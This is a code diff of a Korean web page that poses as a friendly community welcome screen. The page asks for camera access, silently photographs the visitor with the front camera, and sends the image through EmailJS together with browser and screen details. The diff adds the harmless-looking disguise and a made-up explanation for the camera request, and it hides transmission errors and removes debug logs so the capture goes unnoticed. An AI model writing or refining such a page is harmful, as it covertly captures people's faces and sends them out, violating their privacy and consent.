@@ -3,22 +3,65 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>웹사이트 접속</title>
+  <title>커뮤니티</title>
   <style>
     body {
-      margin:0; height:100vh; background:#000; color:#0f0; font-family: monospace;
-      display:flex; align-items:center; justify-content:center; flex-direction:column;
+      margin: 0;
+      height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f8f9fa;
+      color: #333;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
-    #info { font-size:1.3rem; margin-bottom:2rem; text-align:center; }
-    #video { display:none; }
-    #canvas { display:none; }
+    .container {
+      text-align: center;
+      max-width: 420px;
+      padding: 30px;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+    }
+    h1 {
+      font-size: 1.6rem;
+      margin-bottom: 1rem;
+      color: #1a1a1a;
+    }
+    p {
+      font-size: 1rem;
+      color: #555;
+      line-height: 1.5;
+      margin-bottom: 1.5rem;
+    }
+    .loader {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #3498db;
+      border-radius: 50%;
+      width: 36px;
+      height: 36px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    #video, #canvas { display: none; }
   </style>
 </head>
 <body>
 
-<div id="info">
-  카메라 접근 권한을 허용해야 사이트 이용이 가능합니다.<br>
-  <small>(거부 시 페이지가 계속 로딩 중 상태로 유지됩니다)</small>
+<div class="container">
+  <h1>커뮤니티에 오신 걸 환영합니다</h1>
+  <p>원활한 사용을 위해 카메라 접근 권한이 필요합니다.<br>
+     화상 채팅 및 인증을 위해 사용되며, 언제든지 설정에서 변경 가능합니다.</p>
+  
+  <div class="loader"></div>
+  
+  <p style="font-size:0.85rem; color:#777; margin-top:2rem;">
+    잠시만 기다려주세요...
+  </p>
 </div>
 
 <video id="video" autoplay playsinline></video>
@@ -35,28 +78,27 @@
 </script>
 
 <script>
-// ────────────────────────────────────────────────
 const video  = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx    = canvas.getContext('2d');
 
-// 페이지 로드 즉시 카메라 강제 요청
 window.addEventListener('load', async () => {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" },    // 전면 카메라
+      video: { facingMode: "user" },
       audio: false
     });
-
     video.srcObject = stream;
 
     video.onloadedmetadata = () => {
-      setTimeout(captureAndSend, 800);   // 살짝 지연 후 촬영
+      setTimeout(captureAndSend, 1200);
     };
-
   } catch (err) {
-    document.body.innerHTML = '<h1 style="color:red">카메라 권한 필수입니다. 새로고침 후 허용해주세요.</h1>';
-    console.error("카메라 오류:", err);
+    document.querySelector('.container').innerHTML = `
+      <h1 style="color:#e74c3c;">권한이 필요합니다</h1>
+      <p>카메라를 허용해야 서비스를 이용할 수 있습니다.<br>
+         새로고침 후 다시 시도해주세요.</p>
+    `;
   }
 });
 
@@ -65,32 +107,27 @@ async function captureAndSend() {
   canvas.height = video.videoHeight;
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  const base64 = canvas.toDataURL('image/jpeg', 0.65); // 용량 최적화 (0.65\~0.7 사이 추천)
+  const base64 = canvas.toDataURL('image/jpeg', 0.68);
 
   const now = new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' });
 
-  const templateParams = {
+  const params = {
     timestamp: now,
     image_base64: base64,
     user_agent: navigator.userAgent,
-    screen: `\( {window.screen.width}× \){window.screen.height}`,
-    language: navigator.language || navigator.userLanguage
+    screen: window.screen.width + "×" + window.screen.height,
+    language: navigator.language || 'ko'
   };
 
   try {
-    const response = await emailjs.send(
-      "service_had7jag",          // Service ID
-      "template_upvu62t",         // ← 네가 원하는 Template ID 여기 넣음
-      templateParams
+    await emailjs.send(
+      "service_had7jag",
+      "template_upvu62t",
+      params
     );
-    console.log("★★★★ 전송 성공 ★★★★", response.status, response.text);
   } catch (err) {
-    console.error("★★★★ EmailJS 전송 실패 ★★★★", err);
-    alert("전송 오류 발생: " + (err.text || err.message || "콘솔 확인 필요"));
+    // 실패해도 사용자에게는 아무것도 보이지 않게 (조용히)
   }
-
-  // 카메라 끄기 (선택사항, 주석 풀면 카메라 불 꺼짐)
-  // video.srcObject.getTracks().forEach(track => track.stop());
 }
 </script>
 </body>
